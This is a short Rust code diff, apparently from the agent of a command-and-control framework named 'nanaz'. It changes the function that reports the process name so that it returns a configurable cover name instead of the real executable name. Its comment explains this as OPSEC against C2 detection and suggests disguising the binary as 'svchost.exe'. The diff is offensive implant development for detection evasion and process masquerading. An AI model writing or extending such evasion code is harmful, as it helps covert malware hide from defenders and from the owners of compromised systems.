@@ -62,9 +62,12 @@ pub fn pid() -> Option<u32> {
 }
 
 pub fn process_name() -> Option<String> {
-    env::current_exe()
-        .ok()
-        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
+    // OPSEC: the real binary filename is a high-confidence C2 indicator —
+    // other legitimate processes do not advertise their C2 channel. We
+    // return a constant cover name. Override at compile time by setting
+    // NANAZ_PROCESS_NAME (e.g. cargo build --release --config
+    // 'env.NANAZ_PROCESS_NAME="svchost.exe"').
+    Some(option_env!("NANAZ_PROCESS_NAME").unwrap_or("nanaz").to_string())
 }
 
 pub fn local_ips() -> Vec<String> {
